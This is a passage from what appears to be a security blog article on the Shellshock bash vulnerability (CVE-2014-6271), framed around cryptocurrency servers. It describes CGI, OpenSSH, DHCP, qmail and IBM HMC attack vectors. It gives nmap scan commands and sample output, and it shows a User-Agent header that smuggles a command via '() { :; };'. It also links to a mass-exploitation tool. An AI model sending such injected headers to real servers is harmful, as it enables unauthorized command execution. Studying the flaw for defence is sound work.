<p>Compared to Heartbleed, this vulnerability is much easier to exploit.&nbsp;Moreover, in the case of Heartbleed, a cybercriminal could only steal data from memory in the hope that something worthwhile would be found among them, while the&nbsp;<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/">bash vulnerability</a>&nbsp;makes it possible to completely control the system.&nbsp;Thus, it appears to be much more dangerous than Heartbleed.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-36-1024x488.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3622"></figure>



<h3 class="wp-block-heading" id="mozhet-li-eta-uyazvimost-v-budushhem-byt-ispolzovana-dlya-provedeniya-apt-atak">Could this vulnerability be used to launch APT attacks in the future?</h3>



<p>Of course, in the future this vulnerability could be used to develop malware.&nbsp;Malicious programs may appear that automatically check the attacked infrastructure for the presence of this vulnerability, with the aim of further infecting the system or carrying out other types of attacks.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p id="1a3c">This vulnerability is related to&nbsp; bash’s&nbsp;<strong><em>“function export”</em></strong>&nbsp;feature &nbsp;.&nbsp;The export command is used to export a variable or function to the environment of all child processes running in the current shell.&nbsp;This&nbsp;&nbsp;<strong><em>“function export”</em></strong>&nbsp;feature &nbsp;is implemented by encoding the scripts in a table that is common to all instances called the environment variable list.</p>



<p id="1c2b">Although Bash is not an Internet-facing service, many network and Internet services use environment variables to communicate with the server OS.&nbsp;If these environment variables are not cleared before execution, an attacker can send commands via HTTP requests and have them executed by the server operating system.</p>



<p id="04cd"><strong>Operation vectors:</strong></p>



<ol>
<li>CGI based web server</li>



<li>OpenSSH server</li>



<li>DHCP clients</li>



<li>Qmail server</li>



<li>IBM HMC Limited Shell</li>



<li><strong>CGI based web server:</strong></li>
</ol>



<p id="7856">CGI stands for Common Gateway Interface and is used to process document requests.&nbsp;When a certain amount of information is copied from a request into a list of environment variables, and if that request is delegated by a handler program that is a bash script, then bash will receive the environment variables passed by the server and process them.&nbsp;This allows an attacker&nbsp;<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/">to trigger a Shellshock vulnerability</a>&nbsp;using a specially crafted document request.</p>



<pre class="wp-block-code"><code>Nmap :

You can use this two commands to find whether the target website is vulnerable to Shellshock or not.

nmap -sV -p- --script http-shellshock &lt;target&gt;
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls &lt;target&gt;</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p id="57e4">CGI uses bash as its default request handler and this attack does not require any authentication, so most attacks occur on CGI pages to exploit this vulnerability.&nbsp;CGI scripts can be extremely dangerous if not carefully checked.</p>



<pre class="wp-block-code"><code>PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known as Shellshock. It seems the server
|       is executing commands injected via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271</code></pre>



<p id="4be4">2.&nbsp;&nbsp;<strong>OpenSSH server:</strong></p>



<p id="f1f1">OpenSSH is also known as&nbsp;&nbsp;<strong>OpenBSD Secure Shell.&nbsp;</strong>It is a set of secure networking utilities based on the SSH protocol, which provides a secure channel over an insecure network in a client-server architecture.</p>



<p id="cba7">OpenSSH has a&nbsp;&nbsp;<strong><em>“ForceCommand”</em></strong>&nbsp;feature &nbsp;, where a fixed command is executed when the user logs in, rather than just launching an unconstrained shell.&nbsp;A fixed command runs even if the user has specified that another command should be run;&nbsp;in this case, the original command is placed in the&nbsp;&nbsp;<strong><em>“SSH_ORIGINAL_COMMAND”</em></strong>&nbsp;environment variable &nbsp;.&nbsp;When a force command is run in the Bash shell, the Bash shell parses the&nbsp;&nbsp;<strong><em>SSH_ORIGINAL_COMMAND</em></strong>&nbsp;environment variable &nbsp;at startup and runs the commands built into it.&nbsp;A user used their restricted shell access to gain unrestricted shell access by exploiting the Shellshock bug.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-37-1024x546.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3623"></figure>



<p id="cb43">3.&nbsp;&nbsp;<strong>DHCP clients:</strong></p>



<p id="7180">DHCP stands for Dynamic Host Configuration Protocol.&nbsp;It is a network management protocol used in Internet Protocol networks in which a DHCP server dynamically assigns an IP address and other network configuration parameters to each device on the network so that they can communicate with other IP networks.</p>



<p id="5658">Some DHCP clients can also pass Bash commands;&nbsp;a vulnerable system can be attacked when connected to an open Wi-Fi network.&nbsp;A DHCP client typically requests and receives an IP address from a DHCP server, but it can also be given a number of additional options.&nbsp;In one of these variations, a malicious DHCP server could provide a string designed to execute code on a vulnerable workstation or laptop.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-38-1024x562.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3624"></figure>



<p id="43f7">4.&nbsp;&nbsp;<strong>Qmail server:</strong></p>



<p id="3133"><strong>Qmail</strong>&nbsp;&nbsp;is a mail transfer agent running on Unix.&nbsp;It was written in December 1995 by Daniel J. Bernstein as a more secure replacement for the popular Sendmail program.</p>



<p id="cee2">When using Bash to process email messages (for example, through a .forward channel or qmail-alias), the qmail mail server passes external input in such a way that a vulnerable version of Bash can be used.</p>



<p><em>Checking for CGI scripts</em></p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-39-1024x558.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3625"></figure>



<p id="3fe5">5.&nbsp;&nbsp;<strong>IBM HMC Limited Shell:</strong></p>



<p id="c6ba">A restricted&nbsp;&nbsp;<strong>shell</strong>&nbsp;&nbsp;is a Unix shell that restricts some of the capabilities available to an interactive user session or to a shell script running within it.&nbsp;It is intended to provide an extra layer of security, but it is not sufficient to run completely untrusted software.</p>



<p id="b29e">This bug can be used to gain access to Bash from a limited shell of the IBM&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/IBM_Hardware_Management_Console" target="_blank" rel="noreferrer noopener">Hardware Management Console</a>&nbsp;&nbsp;, a tiny Linux variant for system administrators.&nbsp;IBM has released a fix to resolve this issue.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-40-1024x153.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3626"></figure>



<p id="bf35"><strong>Shellshock attack vectors?</strong></p>



<p id="2f14">When you send a request and when that request is received by the server, there are three parts of the request that can be vulnerable to a Shellshock attack.</p>



<ol>
<li>Requested URL</li>



<li>Headers in requests (eg user agent, referrer, etc.)</li>



<li>Arguments in requests (for example, name, id, etc.)</li>
</ol>



<p id="ba66">A Shellshock vulnerability typically occurs when an attacker modifies the original HTTP request to contain the magic&nbsp;&nbsp;<strong><em>() {:;&nbsp;};&nbsp;</em></strong>a thread.</p>



<p id="6f71">Let’s say the attacker changed the User-Agent header from&nbsp;&nbsp;<strong><em>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</em></strong>&nbsp;&nbsp;to just&nbsp;&nbsp;<strong><em>() { :;&nbsp;};&nbsp;/bin/extract</em></strong></p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-41-1024x191.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3627"></figure>



<p id="7c7b">This will create the following variable inside the web server:&nbsp;&nbsp;<strong><em>HTTP_USER_AGENT=() { :;&nbsp;};&nbsp;/bin/extract</em></strong></p>



<p id="b21a">Now, if the web server passes this variable to bash, a Shellshock vulnerability occurs.</p>



<p id="8b99">Instead of treating the&nbsp;&nbsp;<strong><em>HTTP_USER_AGENT</em></strong>&nbsp;variable &nbsp;as a sequence of characters that has no special meaning, bash interprets it as a command that needs to be executed.&nbsp;The problem is that&nbsp;&nbsp;<strong><em>HTTP_USER_AGENT</em></strong>&nbsp;&nbsp;comes from the&nbsp;&nbsp;<strong><em>User-Agent</em></strong>&nbsp;header &nbsp;, which is controlled by the attacker as it comes to the web server in the HTTP request.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Literature:</h2>



<ul>
<li><a href="https://cryptodeep.ru/doc/SHELLSHOCK_ATTACK.pdf" target="_blank" rel="noreferrer noopener"><em>SHELLSHOCK ATTACK</em></a>&nbsp;– Background: Shell Functions [<a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">CryptoDeepTech</a>&nbsp;~ 2023]</li>



<li><em><a href="https://cryptodeep.ru//doc/On_the_Effectiveness_of_Full-ASLR_on_64-bit_Linux.pdf" target="_blank" rel="noreferrer noopener">On the Effectiveness of Full-ASLR on 64-bit Linux</a></em>&nbsp;[Hector Marco-Gisbert, Ismael Ripoll Universitat Politècnica de València Camino de Vera s/n, 46022 Valencia, Spain 20 November 2014]</li>



<li><em><a href="https://cryptodeep.ru/doc/Shellshock_Vulnerability_Tudor_Enache.pdf" target="_blank" rel="noreferrer noopener">Shellshock Vulnerability</a></em>&nbsp;Tudor Enache</li>



<li><em><a href="https://cryptodeep.ru//doc/Tool_Xpl_SHELLSHOCK_Ch3ck_-_Mass_exploitation.pdf" target="_blank" rel="noreferrer noopener">Tool Xpl SHELLSHOCK Ch3ck – Mass exploitation</a></em>&nbsp;– The tool inject a malicious user agent that allows exploring the vulnerabildiade sheellshock running server-side commands [sexta-feira ~ 2015].</li>



<li><em><a href="https://cryptodeep.ru/doc/Bash_bug__the_other_two_RCEs__or_how_we_chipped_away_at_the_original_fix__CVE-2014-6277_and__78.pdf" target="_blank" rel="noreferrer noopener">Bash bug: the other two RCEs, or how we chipped away at the original fix</a></em>&nbsp;(CVE-2014-6277 and ’78)</li>



<li><em><a href="https://cryptodeep.ru/doc/Bash_Vulnerability_%E2%80%93_Shell_Shock_%E2%80%93_Thousands_of_cPanel_Sites_are_High_Risk.pdf" target="_blank" rel="noreferrer noopener">Bash Vulnerability – Shell Shock – Thousands of cPanel Sites are High Risk</a></em>&nbsp;[Daniel Cid ~ 2014]</li>



<li><em><a href="https://cryptodeep.ru/doc/Entenda_o_Shellshock_a_falha_no_Bash_t%C3%A3o_grave_quanto_o_Heartbleed.pdf" target="_blank" rel="noreferrer noopener">Understand Shellshock, the flaw in Bash as serious as Heartbleed</a></em>&nbsp;[RODRIGO GHEDIN~ 2014]</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/24ShellShockAttack" target="_blank" rel="noreferrer noopener">Source</a></strong></p>



<p><strong><a href="https://polynonce.ru/polynonce-attack" target="_blank" rel="noreferrer noopener">POLYNONCE ATTACK</a></strong></p>



<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">ATTACKSAFE SOFTWARE</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><strong><a href="https://youtu.be/fIYYi1kGEnc" target="_blank" rel="noreferrer noopener">Video: https://youtu.be/fIYYi1kGEnc</a></strong></p>



<p><strong><a href="https://cryptodeeptech.ru/shellshock-attack-on-bitcoin" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/shellshock-attack-on-bitcoin</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/G048AB-1024x576.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3631"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">
	</div><!-- .entry-content -->

